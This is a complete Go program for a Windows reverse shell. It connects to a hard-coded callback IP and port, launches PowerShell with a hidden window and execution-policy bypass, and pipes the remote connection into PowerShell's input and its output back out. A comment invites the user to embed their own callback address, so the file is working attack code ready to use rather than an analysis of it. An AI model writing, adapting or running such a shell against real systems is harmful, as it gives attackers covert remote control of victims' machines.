package main

import (
	"bufio"
	"fmt"
	"io"
	"log"
	"net"
	"os/exec"
	"syscall"
)

const (
	// Embed your callback IP and port here:
	callbackIP   = "10.0.0.4"
	callbackPort = "9001"
)

func main() {
	addr := fmt.Sprintf("%s:%s", callbackIP, callbackPort)
	conn, err := net.Dial("tcp", addr)
	if err != nil {
		log.Fatalf("Connect failed: %v", err)
	}
	defer conn.Close()

	// Spawn PowerShell hidden
	cmd := exec.Command(
		`C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`,
		"-NoLogo", "-NoProfile", "-ExecutionPolicy", "Bypass",
	)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}

	stdin, err := cmd.StdinPipe()
	if err != nil {
		log.Fatalf("StdinPipe: %v", err)
	}
	stdout, err := cmd.StdoutPipe()
	if err != nil {
		log.Fatalf("StdoutPipe: %v", err)
	}
	stderr, err := cmd.StderrPipe()
	if err != nil {
		log.Fatalf("StderrPipe: %v", err)
	}

	if err := cmd.Start(); err != nil {
		log.Fatalf("Start PowerShell: %v", err)
	}

	// Relay socket -> PowerShell stdin
	go func() {
		scanner := bufio.NewScanner(conn)
		for scanner.Scan() {
			io.WriteString(stdin, scanner.Text()+"\n")
		}
		stdin.Close()
	}()

	// Relay PowerShell stdout/stderr -> socket
	go io.Copy(conn, stdout)
	go io.Copy(conn, stderr)

	cmd.Wait()
}

